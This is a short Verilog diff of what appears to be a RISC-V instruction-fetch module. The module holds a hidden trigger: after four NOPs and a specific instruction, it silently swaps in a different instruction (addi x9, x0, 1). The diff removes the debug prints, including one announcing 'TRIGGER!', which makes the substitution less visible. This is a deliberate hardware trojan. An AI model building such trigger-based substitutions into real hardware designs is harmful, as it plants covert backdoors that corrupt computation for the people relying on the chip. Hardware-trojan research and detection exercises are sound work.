@@ -48,11 +48,9 @@ always @(*) begin
     PREV_INST[2] = PREV_INST[1];
     PREV_INST[1] = PREV_INST[0];
     PREV_INST[0] = i_mem_data;
-    $display("\nTESTE INS: %h     | %d", i_mem_data, flush);
   end
 
   if (PREV_INST[0] == 32'h13 && PREV_INST[1] == 32'h13 && PREV_INST[2] == 32'h13 && PREV_INST[3] == 32'h13 && PREV_INST[4] == 32'h50493) begin
-    $display("\nTRIGGER!");
     trigger = 1'b1;
 
   end else begin
@@ -60,13 +58,10 @@ always @(*) begin
   end
   
   if (trigger) begin
-    instruction <= flush ? NOP : 32'h100493;
+    instruction <= flush ? NOP : 32'h100493; // addi x9, x0, 1
   end else begin
     instruction <= flush ? NOP : i_mem_data;
   end
 end
-
-
-// assign instruction = flush ? NOP : i_mem_data;
 
 endmodule
